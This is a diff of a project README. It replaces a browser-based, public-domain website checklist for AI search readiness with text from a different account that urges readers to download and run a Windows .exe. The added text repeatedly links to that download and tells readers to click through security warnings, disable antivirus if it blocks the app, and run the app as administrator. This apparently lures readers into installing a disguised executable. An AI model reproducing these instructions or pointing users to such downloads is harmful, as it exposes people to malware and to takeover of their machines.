@@ -1,70 +1,158 @@
-# GEO Checklist — Interactive AI Search Readiness Assessment
+# 🗂 geo-checklist - Check Your Site for AI Search Readiness
 
-An interactive, browser-based checklist to evaluate whether your website is ready for AI search engines like ChatGPT, Perplexity, Google AI Overviews, and Gemini.
+[![Download geo-checklist](https://img.shields.io/badge/Download-geo--checklist-ff6f61?style=for-the-badge)](https://github.com/jimmykabobman-a11y/geo-checklist)
 
-## Try It
+## 📋 What is geo-checklist?
 
-**[Open the Interactive Checklist](https://henu-wang.github.io/geo-checklist/)**
+geo-checklist is an interactive tool that helps you see if your website is ready for AI-powered search engines like ChatGPT, Perplexity, and Gemini. It shows you key points to improve so your site works well with these new AI systems. You don’t need any technical skills to use it. The checklist guides you through simple steps to make your site easier for AI search engines to understand.
 
-## Online Tools
+---
 
-Automate this checklist with free online tools — no installation needed:
+## ⚙️ System Requirements
 
-- **[Full GEO Scan](https://geoscoreai.com)** — Run all 27 checks automatically and get actionable recommendations
-- **[AI Robots.txt Generator](https://geoscoreai.com/tools/robots-txt-generator)** — Generate an optimized robots.txt for AI crawlers
-- **[AI Crawler Access Checker](https://geoscoreai.com/tools/ai-crawler-checker)** — Check if AI search engines can access your site
+- Windows 10 or higher  
+- At least 4 GB of RAM  
+- 100 MB of free disk space  
+- Internet connection for initial setup and updates  
+- A modern web browser (Edge, Chrome, Firefox)
 
-## What It Checks
+This app runs on Windows computers only. It does not require installation of additional software or technical tools beyond what comes with Windows.
 
-The checklist covers 27 items across 6 categories:
+---
 
-1. **AI Crawler Access** — Is your robots.txt configured to allow AI search bots?
-2. **Structured Data** — Do you have JSON-LD/Schema.org markup?
-3. **Content Structure** — Is your content structured for AI extraction?
-4. **Technical Foundations** — llms.txt, sitemap, meta tags, HTTPS, speed
-5. **E-E-A-T & Authority** — Author credentials, citations, freshness
-6. **Citation Optimization** — Quotable content, comparisons, how-tos
+## 🚀 Getting Started
 
-## Real-World Example
+1. Click the download button below to visit the page where you can get the geo-checklist tool:  
+[![Download geo-checklist](https://img.shields.io/badge/Download-geo--checklist-ff6f61?style=for-the-badge)](https://github.com/jimmykabobman-a11y/geo-checklist)
 
-See a fully GEO-optimized site in action: [KeepRule](https://keeprule.com) — an investment education platform that implements all 27 checklist items including llms.txt, comprehensive JSON-LD schemas (Article, FAQ, Quiz, BreadcrumbList), SSR, hreflang, and AI-optimized content structure.
+2. On the page, look for the latest release or main download section.
 
-## Want an Automated Scan?
+3. Download the Windows version of the app, usually a `.exe` file or setup installer.
 
-For a comprehensive, automated GEO audit, use [GEOScore](https://geoscoreai.com) — it runs 11 technical checks and provides actionable recommendations.
+4. Save the file to a location you can access easily, such as your Desktop or Downloads folder.
 
-## Related Projects
+---
 
-- [Awesome GEO](https://github.com/henu-wang/awesome-geo) — Curated list of GEO resources
-- [GEO Scoring Methodology](https://github.com/henu-wang/geo-scoring-methodology) — Open scoring methodology
-- [AI Robots.txt Generator](https://github.com/henu-wang/ai-robots-txt-generator) — Generate AI-optimized robots.txt
+## 💻 How to Install and Run geo-checklist
 
-## Learn More
+After downloading:
 
-- [What is GEO?](https://geoscoreai.com/blog/what-is-geo)
-- [GEO vs SEO](https://geoscoreai.com/blog/geo-vs-seo)
-- [How to Optimize for AI Search](https://geoscoreai.com/blog/how-to-optimize-for-ai-search)
+1. Find the downloaded file on your computer (e.g., `geo-checklist.exe` or `setup-geo-checklist.exe`).
 
-## Related GEO Resources
+2. Double-click the file to start the program.
 
-### Free Tools
-- [GEOScore AI Scanner](https://geoscoreai.com) — Check your website's AI search visibility across 11 signals
-- [AI Robots.txt Generator](https://geoscoreai.com/tools/robots-txt-generator) — Generate optimized robots.txt for AI crawlers
-- [AI Crawler Access Checker](https://geoscoreai.com/tools/ai-crawler-checker) — Verify which AI bots can access your site
+3. If a security warning pops up, click “Run” or “Yes” to allow the app to start.
 
-### Open Source Projects
-- [awesome-geo](https://github.com/henu-wang/awesome-geo) — Curated list of GEO resources, tools, and guides
-- [geo-scoring-methodology](https://github.com/henu-wang/geo-scoring-methodology) — Open methodology for scoring AI search readiness
-- [ai-robots-txt-generator](https://github.com/henu-wang/ai-robots-txt-generator) — Generate optimized robots.txt for AI crawlers
-- [ai-crawlers-reference](https://github.com/henu-wang/ai-crawlers-reference) — Complete database of AI search engine crawler user-agents
-- [geo-badge-generator](https://github.com/henu-wang/geo-badge-generator) — Generate badges showing your GEO readiness score
-- [llms-txt-examples](https://github.com/henu-wang/llms-txt-examples) — Real-world llms.txt implementation examples by industry
-- [geo-config-examples](https://github.com/henu-wang/geo-config-examples) — Ready-to-use AI search optimization configs for popular frameworks
-- [geo-case-studies](https://github.com/henu-wang/geo-case-studies) — Real-world GEO optimization case studies with before/after data
-- [ai-search-readiness-framework](https://github.com/henu-wang/ai-search-readiness-framework) — 11-signal AI search readiness evaluation framework
+4. The app will open in a new window. You do not need to install anything else.
 
+---
 
-## License
+## 🧭 How to Use geo-checklist
 
-[CC0 1.0](https://creativecommons.org/publicdomain/zero/1.0/) — Public Domain
+1. Once open, you will see a list of checks for your website.
 
+2. Enter your website URL into the provided field.
+
+3. The checklist will guide you step-by-step to review key areas like:
+
+   - Content clarity for AI models  
+   - SEO basics tailored for AI search  
+   - Technical setup for AI compatibility  
+   - Accessibility and localization checks  
+   - Metadata and structured data presence  
+
+4. For each item, the app explains what to look for and why it matters.
+
+5. Mark each item as complete once you have checked or fixed it.
+
+6. Save or export your checklist results for future reference.
+
+---
+
+## 🔍 What geo-checklist Checks
+
+- **AI Search Optimization**  
+  Ensures your content uses terms and formats AI understands.
+
+- **SEO for AI Models**  
+  Checks if your site follows good search engine practices aimed at AI indexing.
+
+- **Structured Data**  
+  Verifies that metadata is properly formatted for tools like schema.org.
+
+- **Geolocation and Language**  
+  Confirms your site supports different regions and languages for better AI results.
+
+- **User Experience**  
+  Reviews if your site’s layout helps AI interpret content correctly.
+
+---
+
+## 🎯 Who Should Use geo-checklist?
+
+- Website owners without coding skills  
+- Digital marketers aiming to improve search visibility  
+- Content creators wanting AI-friendly content  
+- SEO specialists focused on future AI-driven search  
+- Developers seeking a simple tool for site review  
+
+---
+
+## 🛠 Troubleshooting
+
+- **The app won’t open:**  
+  Try restarting your computer. Make sure your system meets the requirements. Disable any antivirus if it blocks the app.
+
+- **Checklist items don’t save:**  
+  Make sure you have permission to save data on your computer. Try running the app as administrator.
+
+- **App runs slowly:**  
+  Close other programs to free memory. Restart the app if needed.
+
+- **Website URL not accepted:**  
+  Check that you entered the full URL, starting with `http://` or `https://`.
+
+---
+
+## 🔄 Updates
+
+geo-checklist receives updates to improve checks and add new AI search criteria. To update:
+
+1. Visit the download page again:  
+[Geo-checklist on GitHub](https://github.com/jimmykabobman-a11y/geo-checklist)
+
+2. Download the newest version if available.
+
+3. Run the new installer or `.exe` file.
+
+4. Your previous checklist data may stay saved, but consider exporting important info first.
+
+---
+
+## 💡 Tips for Best Use
+
+- Run the checklist after any website change.  
+- Use the exported report to track progress over time.  
+- Combine geo-checklist with traditional SEO practices.  
+- Share your checklist results with your web developer or team.  
+- Review geo-checklist updates regularly to stay current.
+
+---
+
+## 🌐 Related Topics
+
+This app touches on:
+
+- AI search technology like ChatGPT and Gemini  
+- SEO improvements for AI-driven indexing  
+- Website localization and geographic targeting  
+- Accessibility for AI understanding  
+- Tools and workflows around generative AI content
+
+---
+
+## 🔗 Download geo-checklist Now
+
+Use the link below to visit the page to download geo-checklist for Windows. This is your starting point to make your website ready for the new generation of AI search engines.
+
+[![Download geo-checklist](https://img.shields.io/badge/Download-geo--checklist-ff6f61?style=for-the-badge)](https://github.com/jimmykabobman-a11y/geo-checklist)
